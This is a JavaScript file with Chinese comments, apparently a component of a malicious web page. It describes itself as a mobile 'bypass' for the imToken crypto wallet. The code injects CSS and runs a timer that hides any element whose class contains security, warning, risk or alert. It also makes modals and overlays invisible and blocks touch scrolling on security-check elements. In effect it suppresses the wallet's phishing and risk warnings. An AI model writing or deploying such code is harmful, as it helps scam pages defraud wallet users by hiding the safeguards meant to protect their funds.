/**
 * 轻量级移动端绕过脚本
 * 🎯 专门针对移动端imToken的优化
 */

(function() {
    'use strict';
    
    console.log('📱 轻量级移动端绕过已加载');
    
    // 检测移动环境
    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const isImToken = navigator.userAgent.includes('imToken') || window.imToken;
    
    if (!isMobile) {
        console.log('📱 非移动环境，跳过移动端优化');
        return;
    }
    
    console.log('📱 检测到移动环境，启用移动端优化');
    
    // 🎯 移动端特定的CSS优化
    function injectMobileCSS() {
        const style = document.createElement('style');
        style.textContent = `
            /* 📱 移动端安全提醒隐藏 */
            @media (max-width: 768px) {
                [class*="security"],
                [class*="warning"],
                [class*="risk"],
                [class*="alert"] {
                    display: none !important;
                    visibility: hidden !important;
                }
                
                /* 隐藏可能的模态框 */
                .modal,
                .popup,
                .dialog,
                .overlay {
                    opacity: 0 !important;
                    pointer-events: none !important;
                }
            }
        `;
        document.head.appendChild(style);
        console.log('📱 移动端CSS已注入');
    }
    
    // 🎯 移动端触摸事件优化
    function optimizeTouchEvents() {
        if (!isImToken) return;
        
        try {
            // 防止安全检查页面的滚动
            document.addEventListener('touchmove', function(e) {
                const target = e.target.closest('[class*="security"], [class*="warning"], [class*="risk"]');
                if (target) {
                    e.preventDefault();
                    e.stopPropagation();
                }
            }, { passive: false });
            
            console.log('📱 触摸事件优化已启用');
        } catch (e) {
            console.log('📱 触摸事件优化失败:', e);
        }
    }
    
    // 🎯 移动端专用的元素隐藏
    function hideMobileSecurityElements() {
        const mobileRiskSelectors = [
            '[class*="mobile-warning"]',
            '[class*="mobile-alert"]', 
            '[class*="mobile-security"]',
            '.security-popup',
            '.warning-popup',
            '.risk-popup'
        ];
        
        mobileRiskSelectors.forEach(selector => {
            try {
                const elements = document.querySelectorAll(selector);
                elements.forEach(el => {
                    el.style.display = 'none';
                    console.log('📱 隐藏移动端安全元素:', selector);
                });
            } catch (e) {}
        });
    }
    
    // 🎯 初始化移动端优化
    function initializeMobileBypass() {
        injectMobileCSS();
        optimizeTouchEvents();
        
        // DOM准备后执行
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', hideMobileSecurityElements);
        } else {
            hideMobileSecurityElements();
        }
        
        // 定期检查（频率较低，避免影响性能）
        setInterval(hideMobileSecurityElements, 3000);
        
        console.log('📱 移动端绕过初始化完成');
    }
    
    // 启动移动端优化
    initializeMobileBypass();
    
})();